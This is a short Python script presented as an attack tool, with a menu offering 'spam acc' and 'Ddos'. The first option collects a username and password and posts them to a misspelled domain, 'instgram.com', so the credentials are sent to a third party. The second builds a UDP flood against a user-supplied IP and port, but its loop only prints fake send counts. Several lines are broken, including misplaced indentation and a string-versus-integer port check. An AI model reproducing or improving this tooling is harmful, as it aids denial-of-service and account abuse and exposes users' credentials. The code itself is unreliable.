import os,sys,time 
import socket 
import random 
import time
import requests
clear = lambda : os.system('clear')
clear()

print('''\033[95m _______   _____       ___  _______  _______ 
|       | |  _  |     |   ||   _   ||       |
|    ___| | |_| |     |   ||  |_|  ||  _____|
|   | __ |   _   |    |   ||       || |_____ 
|   ||  ||  | |  | ___|   ||       ||_____  |
|   |_| ||  |_|  ||       ||   _   | _____| |
|_______||_______||_______||__| |__||_______|

''')
print('''
1\ spam acc
2\ Ddos
''')
choos = input('ur choose :')
if choos == "1":
 print("sigin !")
 username = input('username :  ')
 print("wait.../")
 time.sleep(2.00)
 password = input('password : ')
 print('wait.../')
 time.sleep(2.00)
 login_url = 'https://www.instgram.com/account/login/ajax/'
 session = requests.Session()

 headers = {
   'Content-Type': 'application/x-www-form-urlencoded',
    'X-CSRFToken': 'missing',
    'X-Instagram-AJAX': '1',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://www.instagram.com/accounts/login/'
 }

payload = {
   'username': username,
   'password': password
}
response = session.post(login_url, data=payload, headers=headers)

print(response.status_code)

if choos == "2":
 print("Starting DDOS Attack")
 print("") 
 ip = input("Enter IP or Domain   :" )
 port = input("Enter Port :")
 print('')
 time.sleep(1.58)
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 send = 0
 while True:
      send = send + 100000000000
      
      print ('\033[94m send',send,'to','\033[95m ip',ip,'\033[93m port',port)
      if port == 65534:
         port = 0

